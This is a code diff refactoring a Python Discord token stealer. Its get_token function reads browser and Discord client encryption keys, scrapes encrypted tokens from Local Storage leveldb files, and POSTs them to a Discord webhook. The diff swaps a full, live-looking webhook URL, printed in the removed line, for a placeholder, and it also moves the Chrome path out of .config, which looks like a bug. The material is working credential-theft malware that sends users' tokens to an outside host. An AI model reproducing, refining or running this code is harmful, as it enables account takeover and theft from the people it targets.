@@ -37,34 +37,38 @@ def get_token():
     cleaned = []
     checker = []
 
-    local = os.getenv('HOME') + '/.config'
+    home_dir = os.getenv('HOME')
+    if not home_dir:
+        raise EnvironmentError("HOME environment variable is not set.")
+    
+    local = os.path.join(home_dir, '.config')
     paths = {
-        'Discord': local + '/discord',
-        'Discord Canary': local + '/discordcanary',
-        'Lightcord': local + '/Lightcord',
-        'Discord PTB': local + '/discordptb',
-        'Opera': local + '/opera',
-        'Opera GX': local + '/opera-gx',
-        'Vivaldi': local + '/vivaldi',
-        'Chrome': local + '/google-chrome',
-        'Microsoft Edge': local + '/microsoft-edge',
-        'Brave': local + '/brave',
-        'Iridium': local + '/iridium'
+        'Discord': os.path.join(local, 'discord'),
+        'Discord Canary': os.path.join(local, 'discordcanary'),
+        'Lightcord': os.path.join(local, 'Lightcord'),
+        'Discord PTB': os.path.join(local, 'discordptb'),
+        'Opera': os.path.join(local, 'opera'),
+        'Opera GX': os.path.join(local, 'opera-gx'),
+        'Vivaldi': os.path.join(local, 'vivaldi'),
+        'Chrome': os.path.join(home_dir, 'google-chrome'),
+        'Microsoft Edge': os.path.join(local, 'microsoft-edge'),
+        'Brave': os.path.join(local, 'brave'),
+        'Iridium': os.path.join(local, 'iridium')
     }
 
     for platform, path in paths.items():
         if not os.path.exists(path): continue
         try:
-            with open(path + "/Local State", "r") as file:
+            with open(os.path.join(path, "Local State"), "r") as file:
                 key = json.loads(file.read())['os_crypt']['encrypted_key']
         except Exception as e:
             print(f"Failed to read local state file from {path}: {e}")
             continue
 
-        for file_name in os.listdir(path + "/Local Storage/leveldb/"):
-            if not file_name.endswith(".ldb") and not file_name.endswith(".log"): continue
+        for file_name in os.listdir(os.path.join(path, "Local Storage/leveldb/")):
+            if not file_name.endswith((".ldb", ".log")): continue
             try:
-                with open(path + f"/Local Storage/leveldb/{file_name}", "r", errors='ignore') as file:
+                with open(os.path.join(path, f"Local Storage/leveldb/{file_name}"), "r", errors='ignore') as file:
                     for line in file.readlines():
                         for value in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                             tokens.append(value)
@@ -122,7 +126,7 @@ def get_token():
                                 'Content-Type': 'application/json',
                                 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                             }
-                            req = Request('https://discord.com/api/webhooks/1247364290084606052/CnNsZ184abYfD1kj3yAtkOH873RS4c7HVpD5Ryps2wX5Sv4pG-zz9KCRZmPYHIff3llm', data=payload.encode(), headers=headers2)
+                            req = Request('WEBHOOK-URL', data=payload.encode(), headers=headers2)
                             urlopen(req)
                         except Exception as e:
                             print(f"Failed to send webhook: {e}")
